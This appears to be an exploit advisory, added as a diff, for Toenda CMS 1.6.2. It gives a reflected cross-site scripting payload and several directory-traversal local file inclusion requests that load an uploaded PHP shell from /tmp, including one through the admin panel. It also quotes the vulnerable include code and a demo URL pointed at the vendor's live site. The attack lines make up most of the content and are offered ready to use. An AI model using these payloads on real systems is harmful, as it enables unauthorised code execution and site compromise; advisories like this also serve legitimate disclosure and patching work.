@@ -1,0 +1,131 @@
+id: 17637
+date: 03/08/2012
+title: Toenda CMS 1.6.2 Osaka Stable Local File Inclusion
+author: AkaStep
+cves: 
+
+============TOENDA CMS 1.6.2 OSAKA "STABLE" MULTIPLE VULNERABILITIES============
+Vulnerable Software: toendaCMS_1.6.2_Osaka_Stable
+Developed by: http://www.toendacms.org/index.php/en/open/download.html
+toenda.com
+http://www.toendacms.org/index.php/en/open/download.html
+Downloaded from: http://static.toenda.com/toendaCMS_1.6.2_Osaka_Stable.zip
+$ md5sum toendaCMS_1.6.2_Osaka_Stable.zip
+9eab048d4bad3c532ed72d439af2d320 *toendaCMS_1.6.2_Osaka_Stable.zip
+/*
+Tested on: Windows XP SP2 (32 bit)
+Apache: 2.2.21.0
+PHP Version: 5.2.17.17
+mysql> select version()
+    -> ;
++-----------+
+| version() |
++-----------+
+| 5.5.21    |
++-----------+
+*/
+==================================================================
+Severity:                   *High*
+(Due Local File Inclusion)
+==================================================================
+
+=======================Proof Of Concept=============================
+ToendaCMS
+Non persistent XSS (Cross Site Scripting Vulnerability)
+setup/index.php?site=database&lang="onmouseover="alert('pwned')""
+MAGIC QUOTES GPC =OFF
+
+Print Screen:
+
+http://i077.radikal.ru/1203/6b/2167d19a399e.png
+
+==================================================================
+
+====================== ToendaCMS 1.6.2 OSAKA STABLE Local File Inclusions ============================
+(You can execute your own PHP code also [which is *accessible on local file system*])
+
+setup/index.php?site=/tmp/shell
+Where shell placed at: /tmp/shell.php
+
+Default action also vulnerable:
+setup/index.php?site=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/shell
+
+/* Vulnerable code: */
+switch($site){
+case 'language':
+include($site.'.php');
+break;
+
+default:
+include('inc/'.$site.'.php');
+break;
+
+}
+/*  END OF VULNERABLE CODE */
+
+
+Requires login to system as admin:
+toenda/engine/admin/admin.php?id_user=VALIDSSID&site=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/decode
+(Assume your shell uploaded to /tmp/ as decode.php which is not problem on *shared hostings*)
+==================================================================
+
+
+toenda/index.php?s=../../../
+// rename your shell to index.php and upload to
+/tmp/
+and exploitate like bottom.
+/* Vulnerable code
+
+/*
+  LAYOUT
+*/
+// engine/tcms_kernel\tcms_defines.lib.php
+if(trim($s) != 'printer') {
+  if($tcms_file->checkFileExist('theme/'.$s.'/index.php')) {
+    /*_LAYOUT*/
+    if(!defined('_LAYOUT')) define('_LAYOUT', 'theme/'.$s.'/index.php');
+  }
+  else {
+    $tcms_error = new tcms_error('tcms_defines.lib.php', 2, $s, $imagePath);
+    $tcms_error->showMessage(false);
+
+    if(!defined('_LAYOUT')) {
+      define('_LAYOUT', '');
+    }
+
+    unset($tcms_error);
+  }
+}
+else {
+  /*_LAYOUT*/
+  if(!defined('_LAYOUT')) {
+    define('_LAYOUT', 'theme/'.$s.'/index.php');
+  }
+}
+
+
+
+*/
+
+
+Demo: http://www.toendacms.org/?s=../engine/admin/
+
+Print Screens:
+
+http://s017.radikal.ru/i415/1203/86/0c5266e5dc58.png
+
+http://s60.radikal.ru/i169/1203/8c/59224ca1b81b.png
+
+http://s005.radikal.ru/i209/1203/74/671c19b3b6a6.png
+
+
+
+Note: Previous versions may also affected but not tested.
+======================EOF=======================================
+
+
+/AkaStep ^_^
+
+
+
+#  0day.today [2023-03-26]  #
